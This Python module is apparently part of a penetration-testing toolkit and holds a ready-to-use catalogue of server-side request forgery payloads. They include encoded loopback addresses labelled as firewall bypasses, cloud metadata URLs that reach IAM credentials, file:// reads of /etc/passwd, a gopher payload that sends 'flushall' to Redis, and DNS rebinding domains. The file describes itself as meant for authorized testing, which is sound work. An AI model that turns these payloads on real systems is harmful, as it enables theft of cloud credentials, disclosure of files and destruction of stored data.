"""
SSRF Payloads - Server-Side Request Forgery payloads with WAF bypass variants.

Provides payloads categorized by technique: internal IP access, cloud metadata
endpoint enumeration, protocol smuggling, and DNS rebinding.
For use in authorized penetration testing engagements only.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import List, Optional


@dataclass
class SSRFPayload:
    """A single SSRF payload."""
    payload: str
    technique: str          # internal_ip, cloud_metadata, protocol_smuggling, dns_rebinding
    description: str
    waf_bypass: bool = False
    risk_indicator: str = "ssrf"


# ---------------------------------------------------------------------------
# Techniques
# ---------------------------------------------------------------------------

ALL_TECHNIQUES = ["internal_ip", "cloud_metadata", "protocol_smuggling", "dns_rebinding"]


def get_all_techniques() -> List[str]:
    return list(ALL_TECHNIQUES)


# ---------------------------------------------------------------------------
# Internal IP payloads
# ---------------------------------------------------------------------------

_INTERNAL_IP_PAYLOADS = [
    SSRFPayload(
        "http://127.0.0.1",
        "internal_ip",
        "Standard IPv4 loopback",
    ),
    SSRFPayload(
        "http://0.0.0.0",
        "internal_ip",
        "Unspecified address - often resolves to localhost",
    ),
    SSRFPayload(
        "http://localhost",
        "internal_ip",
        "Hostname loopback",
    ),
    SSRFPayload(
        "http://127.1",
        "internal_ip",
        "Shortened IPv4 loopback (127.0.0.1)",
    ),
    SSRFPayload(
        "http://2130706433",
        "internal_ip",
        "Decimal representation of 127.0.0.1",
        waf_bypass=True,
    ),
    SSRFPayload(
        "http://[::1]",
        "internal_ip",
        "IPv6 loopback address",
    ),
    SSRFPayload(
        "http://0177.0.0.1",
        "internal_ip",
        "Octal representation of 127.0.0.1",
        waf_bypass=True,
    ),
    SSRFPayload(
        "http://0x7f.0x0.0x0.0x1",
        "internal_ip",
        "Hexadecimal representation of 127.0.0.1",
        waf_bypass=True,
    ),
]


# ---------------------------------------------------------------------------
# Cloud metadata payloads
# ---------------------------------------------------------------------------

_CLOUD_METADATA_PAYLOADS = [
    # AWS
    SSRFPayload(
        "http://169.254.169.254/latest/meta-data/",
        "cloud_metadata",
        "AWS EC2 instance metadata endpoint",
    ),
    SSRFPayload(
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "cloud_metadata",
        "AWS IAM role credentials via metadata",
    ),
    SSRFPayload(
        "http://169.254.169.254/latest/user-data",
        "cloud_metadata",
        "AWS EC2 user-data (may contain secrets)",
    ),
    # GCP
    SSRFPayload(
        "http://metadata.google.internal/computeMetadata/v1/",
        "cloud_metadata",
        "GCP compute metadata endpoint",
    ),
    SSRFPayload(
        "http://169.254.169.254/computeMetadata/v1/project/project-id",
        "cloud_metadata",
        "GCP project ID via metadata IP",
    ),
    # Azure
    SSRFPayload(
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "cloud_metadata",
        "Azure instance metadata (IMDS v2)",
    ),
    # DigitalOcean
    SSRFPayload(
        "http://169.254.169.254/metadata/v1/",
        "cloud_metadata",
        "DigitalOcean droplet metadata endpoint",
    ),
    # AWS IMDSv2 bypass via redirect
    SSRFPayload(
        "http://[::ffff:169.254.169.254]/latest/meta-data/",
        "cloud_metadata",
        "AWS metadata via IPv6-mapped IPv4 address",
        waf_bypass=True,
    ),
]


# ---------------------------------------------------------------------------
# Protocol smuggling payloads
# ---------------------------------------------------------------------------

_PROTOCOL_SMUGGLING_PAYLOADS = [
    SSRFPayload(
        "file:///etc/passwd",
        "protocol_smuggling",
        "Local file read via file:// protocol",
    ),
    SSRFPayload(
        "file:///etc/hostname",
        "protocol_smuggling",
        "Hostname disclosure via file:// protocol",
    ),
    SSRFPayload(
        "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
        "protocol_smuggling",
        "Gopher protocol smuggling to Redis",
    ),
    SSRFPayload(
        "dict://127.0.0.1:6379/info",
        "protocol_smuggling",
        "DICT protocol to probe Redis",
    ),
    SSRFPayload(
        "ftp://127.0.0.1:21",
        "protocol_smuggling",
        "FTP protocol probe on localhost",
    ),
]


# ---------------------------------------------------------------------------
# DNS rebinding payloads
# ---------------------------------------------------------------------------

_DNS_REBINDING_PAYLOADS = [
    SSRFPayload(
        "http://spoofed.burpcollaborator.net",
        "dns_rebinding",
        "DNS rebinding via collaborator-style domain",
    ),
    SSRFPayload(
        "http://7f000001.nip.io",
        "dns_rebinding",
        "DNS rebinding via nip.io (resolves to 127.0.0.1)",
        waf_bypass=True,
    ),
    SSRFPayload(
        "http://127.0.0.1.sslip.io",
        "dns_rebinding",
        "DNS rebinding via sslip.io (resolves to 127.0.0.1)",
        waf_bypass=True,
    ),
    SSRFPayload(
        "http://localtest.me",
        "dns_rebinding",
        "DNS pinning bypass via localtest.me (resolves to 127.0.0.1)",
        waf_bypass=True,
    ),
]


# ---------------------------------------------------------------------------
# All payloads combined
# ---------------------------------------------------------------------------

_ALL_PAYLOADS = {
    "internal_ip": _INTERNAL_IP_PAYLOADS,
    "cloud_metadata": _CLOUD_METADATA_PAYLOADS,
    "protocol_smuggling": _PROTOCOL_SMUGGLING_PAYLOADS,
    "dns_rebinding": _DNS_REBINDING_PAYLOADS,
}


def get_ssrf_payloads(
    technique: Optional[str] = None,
) -> List[SSRFPayload]:
    """Get SSRF payloads filtered by technique.

    Parameters
    ----------
    technique : str, optional
        SSRF technique: internal_ip, cloud_metadata, protocol_smuggling,
        dns_rebinding.  If None, returns all payloads across every technique.

    Returns
    -------
    list of SSRFPayload
    """
    if technique:
        return list(_ALL_PAYLOADS.get(technique, []))
    # Return all payloads when no technique filter is specified
    result: List[SSRFPayload] = []
    for payloads in _ALL_PAYLOADS.values():
        result.extend(payloads)
    return result


def get_waf_bypass_payloads() -> List[SSRFPayload]:
    """Get only WAF bypass payloads across all techniques."""
    result: List[SSRFPayload] = []
    for payloads in _ALL_PAYLOADS.values():
        result.extend(p for p in payloads if p.waf_bypass)
    return result


def get_all_payloads_flat() -> List[SSRFPayload]:
    """Return all payloads across all techniques."""
    result: List[SSRFPayload] = []
    for payloads in _ALL_PAYLOADS.values():
        result.extend(payloads)
    return result
